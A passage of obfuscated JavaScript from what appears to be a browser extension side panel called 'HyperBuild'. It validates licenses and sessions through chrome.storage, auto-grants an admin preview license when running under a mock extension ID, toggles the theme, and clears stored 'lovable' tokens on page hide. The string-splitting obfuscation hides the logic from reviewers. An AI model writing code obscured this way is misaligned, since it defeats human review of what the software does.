console['war'+'n']('[Hy'+'per'+'Bui'+'ld]'+'\x20Er'+'ror'+'\x20ge'+'tti'+'ng\x20'+'dev'+'ice'+'Id,'+'\x20us'+'ing'+'\x20fa'+'llb'+'ack'+':',_n51d50a),_n2f3531='err'+'or-'+Date['now']();
}
chrome['run'+'tim'+'e']['id']==='moc'+'k-e'+'xte'+'nsi'+'on-'+'id'&&chrome['sto'+'rag'+'e']['loc'+'al']['get'](['ql_'+'lic'+'ens'+'e_v'+'ali'+'d'],_n2dab1f=>{
if(!_n2dab1f['ql_'+'lic'+'ens'+'e_v'+'ali'+'d']){
console['log']('[Hy'+'per'+'Bui'+'ld]'+'\x20Au'+'to-'+'act'+'iva'+'tin'+'g\x20P'+'rev'+'iew'+'\x20Mo'+'de'),_n1ba7e3='Adm'+'in\x20'+'(Pr'+'evi'+'ew)',_n10b465=new Date(Date['now']()+0x16d*0x5265c00)['toI'+'SOS'+'tri'+'ng'](),_n472837='act'+'ive',_n6a372d='pre'+'vie'+'w-s'+'ess'+'ion';
const _nd6964a={
}
;
_nd6964a['ql_'+'lic'+'ens'+'e_v'+'ali'+'d']=!![],_nd6964a['ql_'+'lk']='PRE'+'VIE'+'W-M'+'ODE',_nd6964a['ql_'+'ses'+'sio'+'n_i'+'d']='pre'+'vie'+'w-s'+'ess'+'ion',_nd6964a['ql_'+'use'+'r_n'+'ame']=_n1ba7e3,_nd6964a['ql_'+'exp'+'ire'+'s_a'+'t']=_n10b465,_nd6964a['ql_'+'lic'+'ens'+'e_s'+'tat'+'us']='act'+'ive',chrome['sto'+'rag'+'e']['loc'+'al']['set'](_nd6964a,()=>_n3e2964());
}
}
),chrome['sto'+'rag'+'e']['loc'+'al']['get'](['ql_'+'dar'+'k_m'+'ode'],_n4047ad=>{
const _n4ab412=_n4047ad['ql_'+'dar'+'k_m'+'ode']!==![];
document['doc'+'ume'+'ntE'+'lem'+'ent']['set'+'Att'+'rib'+'ute']('dat'+'a-t'+'hem'+'e',_n4ab412?'dar'+'k':'lig'+'ht');
const _n153718=document['get'+'Ele'+'men'+'tBy'+'Id']('the'+'meK'+'nob');
if(_n153718)_n153718['inn'+'erH'+'TML']=_n4ab412?SP_SVG['moo'+'n']:SP_SVG['sun'];
document['que'+'ryS'+'ele'+'cto'+'rAl'+'l']('#ql'+'-th'+'eme'+'-bt'+'n')['for'+'Eac'+'h'](_n493a06=>{
!_n493a06['que'+'ryS'+'ele'+'cto'+'r']('#th'+'eme'+'Kno'+'b')&&(_n493a06['inn'+'erH'+'TML']=_n4ab412?SP_SVG['moo'+'n']:SP_SVG['sun']);
}
);
}
),chrome['sto'+'rag'+'e']['loc'+'al']['get'](['ql_'+'lic'+'ens'+'e_v'+'ali'+'d','ql_'+'lk','ql_'+'use'+'r_n'+'ame','ql_'+'exp'+'ire'+'s_a'+'t','ql_'+'act'+'iva'+'ted'+'_at','ql_'+'lic'+'ens'+'e_s'+'tat'+'us','ql_'+'ses'+'sio'+'n_i'+'d','ql_'+'ed','ql_'+'ck','ql_'+'has'+'_sk'+'ill'+'s'],async _na18126=>{
if(_na18126['ql_'+'has'+'_sk'+'ill'+'s']!==undefined)_n12c2f4=!!_na18126['ql_'+'has'+'_sk'+'ill'+'s'];
if(_na18126['ql_'+'lic'+'ens'+'e_v'+'ali'+'d']){
const _n2de36a=_na18126['ql_'+'exp'+'ire'+'s_a'+'t']&&new Date(_na18126['ql_'+'exp'+'ire'+'s_a'+'t'])['get'+'Tim'+'e']()<=Date['now']();
if(!_na18126['ql_'+'ck']){
_n4ce99a(_na18126['ql_'+'lic'+'ens'+'e_s'+'tat'+'us']==='tri'+'al'||_n2de36a?spT('log'+'in_'+'tri'+'al_'+'exp'+'ire'+'d'):spT('log'+'in_'+'inv'+'ali'+'d_r'+'elo'+'gin'));
return;
}
_n1ba7e3=_na18126['ql_'+'use'+'r_n'+'ame']||null,_n10b465=_na18126['ql_'+'exp'+'ire'+'s_a'+'t']||null,_n472837=_na18126['ql_'+'lic'+'ens'+'e_s'+'tat'+'us']||null,_n6a372d=_na18126['ql_'+'ses'+'sio'+'n_i'+'d']||null,_n3e2964();
if(_na18126['ql_'+'lk']&&_na18126['ql_'+'lk']!=='PRE'+'VIE'+'W-M'+'ODE')try{
const _n364969=_na18126['ql_'+'ed']||_n2f3531,_n2d4db1={
}
;
_n2d4db1['que'+'enK'+'ey']=_na18126['ql_'+'lk'],_n2d4db1['chi'+'ldK'+'ey']=_na18126['ql_'+'ck']||null,_n2d4db1['ses'+'sio'+'nId']=_n6a372d,_n2d4db1['dev'+'ice'+'IdV'+'alu'+'e']=_n364969,_n2d4db1['use'+'rNa'+'meV'+'alu'+'e']=_n1ba7e3,_n2d4db1['exp'+'ire'+'sAt'+'Val'+'ue']=_n10b465,_n2d4db1['act'+'iva'+'ted'+'AtV'+'alu'+'e']=null,_n2d4db1['sta'+'tus'+'Val'+'ue']=_n472837;
const _n52da19=await _n3ebccc(_n2d4db1);
if(_n52da19['val'+'id']){
_n1ba7e3=_n52da19['use'+'r_n'+'ame']||_n1ba7e3,_n10b465=_n52da19['exp'+'ire'+'s_a'+'t']||_n10b465,_n472837=_n52da19['sta'+'tus']||_n472837,_n6a372d=_n52da19['ses'+'sio'+'n_i'+'d']||_n6a372d;
const _n3658a3={
}
;
_n3658a3['ql_'+'use'+'r_n'+'ame']=_n1ba7e3,_n3658a3['ql_'+'exp'+'ire'+'s_a'+'t']=_n10b465,_n3658a3['ql_'+'lic'+'ens'+'e_s'+'tat'+'us']=_n472837,_n3658a3['ql_'+'ses'+'sio'+'n_i'+'d']=_n6a372d,chrome['sto'+'rag'+'e']['loc'+'al']['set'](_n3658a3);
const _n8fd66e=document['get'+'Ele'+'men'+'tBy'+'Id']('sp-'+'nam'+'e');
if(_n8fd66e)_n8fd66e['tex'+'tCo'+'nte'+'nt']=_n1ba7e3||'Use'+'r';
_n789aef(),_n3ee618=!![],_n4ae681(_na18126['ql_'+'lk']),_n13f13d(_n10b465);
}
else{
const _n53487a=_n411d15(_n52da19);
_n4ce99a(_n53487a?spT('log'+'in_'+'dev'+'ice'+'_co'+'nfl'+'ict'):_n264573(_n52da19,_n472837,_n10b465));
}
}
catch(_n2d9eef){
}
}
else chrome['run'+'tim'+'e']['id']!=='moc'+'k-e'+'xte'+'nsi'+'on-'+'id'&&_n29f51a();
}
);
}
());
function _n34810a(){
console['log']('[Si'+'dep'+'ane'+'l]\x20'+'ini'+'tSt'+'ars'+'\x20st'+'ub\x20'+'cal'+'led');
}
function _n56e807(){
console['log']('[Si'+'dep'+'ane'+'l]\x20'+'ini'+'tPa'+'rti'+'cle'+'s\x20s'+'tub'+'\x20ca'+'lle'+'d');
}
function _n53bf21(){
console['log']('[Si'+'dep'+'ane'+'l]\x20'+'set'+'upS'+'ett'+'ing'+'s\x20s'+'tub'+'\x20ca'+'lle'+'d');
}
_n34810a(),_n56e807(),_n53bf21(),window['add'+'Eve'+'ntL'+'ist'+'ene'+'r']('pag'+'ehi'+'de',()=>{
try{
chrome['sto'+'rag'+'e']['loc'+'al']['rem'+'ove'](['lov'+'abl'+'e_t'+'oke'+'n','lov'+'abl'+'e_p'+'roj'+'ect'+'Id']);
}
catch(_nda0498){
}
}
);
}
());
